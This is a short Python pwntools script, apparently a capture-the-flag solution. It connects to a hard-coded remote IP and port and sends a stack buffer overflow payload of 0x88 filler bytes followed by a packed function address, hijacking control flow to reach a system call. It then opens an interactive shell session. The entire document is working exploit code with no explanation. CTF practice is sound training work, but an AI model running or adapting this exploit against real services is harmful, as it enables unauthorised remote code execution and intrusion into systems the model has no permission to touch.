from pwn import *
p = remote('47.106.94.13',50002)
context.log_level = 'debug'

sysadr = 0x400596

payload = 'a' * 0x88 + p64(sysadr)
p.recvuntil('World\n')
p.sendline(payload)
p.interactive()